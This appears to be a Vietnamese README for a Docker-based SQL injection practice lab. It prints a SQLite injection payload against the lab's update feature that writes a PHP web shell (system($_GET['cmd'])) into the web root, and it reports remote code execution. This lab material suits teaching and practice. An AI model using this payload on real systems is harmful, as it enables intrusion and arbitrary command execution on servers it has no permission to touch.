## Vào thư mục chứa Dockerfile và run command: 

`docker build -t sql_oob .`

`docker run sql_oob`

## Khai thác lỗi SQLi

Trang web dùng CSDL Sqlite3

### Nơi xảy ra lỗi

Các chức năng: insert, update

Demo chức năng update:

Payload: `'; ATTACH DATABASE '/var/www/html/lol.php' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn(dataz) VALUES ("<?php system($_GET['cmd']) ?>"); --`

Sửa request:

![image](https://user-images.githubusercontent.com/86275419/222055491-28ef0953-cbad-4f0a-9f0a-e5e87d94f238.png)

Kết quả: có thể RCE tùy vào mục đích 

![image](https://user-images.githubusercontent.com/86275419/222056384-c2a45854-4531-40e6-a78d-2ceb515c2c59.png)



